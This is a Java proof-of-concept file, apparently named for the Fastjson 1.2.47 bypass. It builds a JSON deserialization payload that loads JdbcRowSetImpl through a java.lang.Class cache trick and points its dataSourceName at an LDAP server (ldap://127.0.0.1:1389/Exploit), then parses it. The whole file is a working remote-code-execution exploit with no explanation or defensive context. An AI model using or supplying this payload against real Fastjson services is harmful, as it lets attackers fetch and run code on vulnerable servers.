import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class SuccessBypassEXP_47 {
    public static void main(String[] argv){
        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}